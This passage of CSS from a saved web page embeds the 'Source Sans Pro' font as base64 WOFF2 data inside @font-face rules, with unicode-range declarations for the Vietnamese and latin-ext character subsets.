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)
                    format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xK3dSBYKcSV-LCoeQqfX1RYOo3qNq7lqDY.woff2*/ url(data:font/woff2;base64,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